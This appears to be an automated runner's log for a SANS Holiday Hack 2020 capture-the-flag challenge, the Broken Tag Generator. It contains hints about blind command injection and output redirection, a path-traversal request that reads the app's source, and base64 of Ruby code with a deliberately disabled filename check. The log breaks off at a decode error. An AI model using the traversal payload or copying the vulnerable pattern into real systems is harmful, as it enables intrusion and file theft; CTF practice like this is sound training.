2020-12-28 23:37:42.026 +00:00 [VRB] Started SANS Holiday Hack, December 2020
2020-12-28 23:37:42.043 +00:00 [VRB] Using CTF runner 0.1.0-alpha.21
2020-12-28 23:37:42.045 +00:00 [VRB] Running challange BrokenTagGenerator
2020-12-28 23:37:42.047 +00:00 [INF] Objective 8

                Help Noel Boetie fix the Tag Generator in the Wrapping Room. 
                What value is in the environment variable GREETZ? 
                Talk to Holly Evergreen in the kitchen for help with this.

                https://tag-generator.kringlecastle.com/

            
2020-12-28 23:37:42.049 +00:00 [INF] Holly Evergreen

                Hi Santa!
                If you have a chance, I'd love to get your feedback on the Tag Generator updates!
                I'm a little concerned about the file upload feature, but Noel thinks it will be fine.

                Sorry to be a pest Santa, but could you look at the Tag Generator?
                I've been looking at it, and I wonder if the source code would provide more insight?
                I told Noel we should be more careful about disclosing information in error messages.

                I tried what you suggested and enumerating all endpoints really is good idea to understand an application's functionality.
                Sometimes though, I find the Content-Type header hinders the browser more than it helps.
                Blind command injection can be frustrating though. Do you think output redirection would help?

            
2020-12-28 23:37:42.050 +00:00 [INF] Redirect to Download

                From: Holly Evergreen
                Objective: 8) Broken Tag Generator
                If you find a way to execute code blindly, I bet you can redirect to a file then download that file!

            
2020-12-28 23:37:42.050 +00:00 [INF] Source Code Retrieval
               
                From: Holly Evergreen
                Objective: 8) Broken Tag Generator
                We might be able to find the problem if we can get source code!

            
2020-12-28 23:37:42.050 +00:00 [INF] Download File Mechanism
               
                From: Holly Evergreen
                Objective: 8) Broken Tag Generator
                Once you know the path to the file, we need a way to download it!

            
2020-12-28 23:37:42.050 +00:00 [INF] Error Page Message Disclosure
                
                From: Holly Evergreen
                Objective: 8) Broken Tag Generator
                Can you figure out the path to the script? It's probably on error pages!
            
2020-12-28 23:37:42.051 +00:00 [INF] Content-Type Gotcha
               
                From: Holly Evergreen
                Objective: 8) Broken Tag Generator
                If you're having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)!

            
2020-12-28 23:37:42.051 +00:00 [INF] Endpoint Exploration
                
                From: Holly Evergreen
                Objective: 8) Broken Tag Generator
                Is there an endpoint that will print arbitrary files?
            
2020-12-28 23:37:42.051 +00:00 [INF] Source Code Analysis

                From: Holly Evergreen
                Objective: 8) Broken Tag Generator
                I'm sure there's a vulnerability in the source somewhere... surely Jack wouldn't leave their mark?

            
2020-12-28 23:37:42.052 +00:00 [INF] Patience and Timing

                From: Holly Evergreen
                Objective: 8) Broken Tag Generator
                Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output!
            
2020-12-28 23:37:42.052 +00:00 [INF] Upload a text file and we find out about /app/lib/app.rb and some /tmp/RackMultipart20201228-1-dzifup.txt

                ERROR
                Something went wrong!
                Error in /app/lib/app.rb: Unsupported file type: /tmp/RackMultipart20201228-1-dzifup.txt

                Close
            
2020-12-28 23:37:42.053 +00:00 [INF] https://tag-generator.kringlecastle.com/app

                Something went wrong!
                Error in /app/lib/app.rb: Route not found

            
2020-12-28 23:37:42.055 +00:00 [INF] fabric.js

                toDataURL: function(t, e, i) {
                        return t.toDataURL("image/" + e, i)
                },
            
2020-12-28 23:37:42.057 +00:00 [INF] https://tag-generator.kringlecastle.com/share

                Something went wrong!
                Error in /app/lib/app.rb: ID is missing!
            
2020-12-28 23:37:42.058 +00:00 [INF] https://tag-generator.kringlecastle.com/share

                Something went wrong!
                Error in /app/lib/app.rb: ID is missing!

                https://tag-generator.kringlecastle.com/share?id=????
            
2020-12-28 23:37:42.059 +00:00 [INF] https://tag-generator.kringlecastle.com/image?id=

                PGgxPlNvbWV0aGluZyB3ZW50IHdyb25nITwvaDE+Cgo8cD5FcnJvciBpbiAvYXBwL2xpYi9hcHAucmI6IElzIGEgZGlyZWN0b3J5IEAgaW9fZnJlYWQgLSAvdG1wLzwvcD4K
            
2020-12-28 23:37:42.061 +00:00 [INF] base64 returns <p>Error in /app/lib/app.rb: Is a directory @ io_fread - /tmp/</p>
<h1>Something went wrong!</h1>

<p>Error in /app/lib/app.rb: Is a directory @ io_fread - /tmp/</p>

2020-12-28 23:37:42.062 +00:00 [INF] https://tag-generator.kringlecastle.com/image?id=..%2Fapp%2Flib%2Fapp.rb

               IyBlbmNvZGluZzogQVNDSUktOEJJVAoKVE1QX0ZPTERFUiA9ICcvdG1wJwpGSU5BTF9GT0xERVIgPSAnL3RtcCcKCiMgRG9uJ3QgcHV0IHRoZSB1cGxvYWRzIGluIHRoZSBhcHBsaWNhdGlvbiBmb2xkZXIKRGlyLmNoZGlyIFRNUF9GT0xERVIKCnJlcXVpcmUgJ3J1YnlnZW1zJwoKcmVxdWlyZSAnanNvbicKcmVxdWlyZSAnc2luYXRyYScKcmVxdWlyZSAnc2luYXRyYS9iYXNlJwpyZXF1aXJlICdzaW5nbG9nZ2VyJwpyZXF1aXJlICdzZWN1cmVyYW5kb20nCgpyZXF1aXJlICd6aXAnCnJlcXVpcmUgJ3NpbmF0cmEvY29va2llcycKcmVxdWlyZSAnY2dpJwoKcmVxdWlyZSAnZGlnZXN0L3NoYTEnCgpMT0dHRVIgPSA6OlNpbmdMb2dnZXIuaW5zdGFuY2UoKQoKTUFYX1NJWkUgPSAxMDI0KioyKjUgIyA1bWIKCiMgTWFudWFsbHkgZXNjYXBpbmcgaXMgYW5ub3lpbmcsIGJ1dCBTaW5hdHJhIGlzIGxpZ2h0d2VpZ2h0IGFuZCBkb2Vzbid0IGhhdmUKIyBzdHVmZiBsaWtlIHRoaXMgYnVpbHQgaW4gOigKZGVmIGgoaHRtbCkKICBDR0kuZXNjYXBlSFRNTCBodG1sCmVuZAoKZGVmIGhhbmRsZV96aXAoZmlsZW5hbWUpCiAgTE9HR0VSLmRlYnVnKCJQcm9jZXNzaW5nICN7IGZpbGVuYW1lIH0gYXMgYSB6aXAiKQogIG91dF9maWxlcyA9IFtdCgogIFppcDo6RmlsZS5vcGVuKGZpbGVuYW1lKSBkbyB8emlwX2ZpbGV8CiAgICAjIEhhbmRsZSBlbnRyaWVzIG9uZSBieSBvbmUKICAgIHppcF9maWxlLmVhY2ggZG8gfGVudHJ5fAogICAgICBMT0dHRVIuZGVidWcoIkV4dHJhY3RpbmcgI3tlbnRyeS5uYW1lfSIpCgogICAgICBpZiBlbnRyeS5zaXplID4gTUFYX1NJWkUKICAgICAgICByYWlzZSAnRmlsZSB0b28gbGFyZ2Ugd2hlbiBleHRyYWN0ZWQnCiAgICAgIGVuZAoKICAgICAgaWYgZW50cnkubmFtZSgpLmVuZF93aXRoPygnemlwJykKICAgICAgICByYWlzZSAnTmVzdGVkIHppcCBmaWxlcyBhcmUgbm90IHN1cHBvcnRlZCEnCiAgICAgIGVuZAoKICAgICAgIyBJIHdvbmRlciB3aGF0IHRoaXMgd2lsbCBkbz8gLS1KYWNrCiAgICAgICMgaWYgZW50cnkubmFtZSAhfiAvXlthLXpBLVowLTkuXy1dKyQvCiAgICAgICMgICByYWlzZSAnSW52YWxpZCBmaWxlbmFtZSEgRmlsZW5hbWVzIG1heSBjb250YWluIGxldHRlcnMsIG51bWJlcnMsIHBlcmlvZCwgdW5kZXJzY29yZSwgYW5kIGh5cGhlbicKICAgICAgIyBlbmQKCiAgICAgICMgV2Ugd2FudCB0byBleHRyYWN0IGludG8gVE1QX0ZPTERFUgogICAgICBvdXRfZmlsZSA9ICIjeyBUTVBfRk9MREVSIH0vI3sgZW50cnkubmFtZSB9IgoKICAgICAgIyBFeHRyYWN0IHRvIGZpbGUgb3IgZGlyZWN0b3J5IGJhc2VkIG9uIG5hbWUgaW4gdGhlIGFyY2hpdmUKICAgICAgZW50cnkuZXh0cmFjdChvdXRfZmlsZSkgewogICAgICAgICMgSWYgdGhlIGZpbGUgZXhpc3RzLCBzaW1wbHkgb3ZlcndyaXRlCiAgICAgICAgdHJ1ZQogICAgICB9CgogICAgICAjIFByb2Nlc3MgaXQKICAgICAgb3V0X2ZpbGVzIDw8IHByb2Nlc3NfZmlsZShvdXRfZmlsZSkKICAgIGVuZAogIGVuZAoKICByZXR1cm4gb3V0X2ZpbGVzCmVuZAoKZGVmIGhhbmRsZV9pbWFnZShmaWxlbmFtZSkKICBvdXRfZmlsZW5hbWUgPSAiI3sgU2VjdXJlUmFuZG9tLnV1aWQgfSN7RmlsZS5leHRuYW1lKGZpbGVuYW1lKS5kb3duY2FzZX0iCiAgb3V0X3BhdGggPSAiI3sgRklOQUxfRk9MREVSIH0vI3sgb3V0X2ZpbGVuYW1lIH0iCgogICMgUmVzaXplIGFuZCBjb21wcmVzcyBpbiB0aGUgYmFja2dyb3VuZAogIFRocmVhZC5uZXcgZG8KICAgIGlmICFzeXN0ZW0oImNvbnZlcnQgLXJlc2l6ZSA4MDB4NjAwXFw  
            
2020-12-28 23:37:42.140 +00:00 [ERR] The input is not a valid Base-64 string as it contains a non-base 64 character, more than two padding characters, or an illegal character among the padding characters.
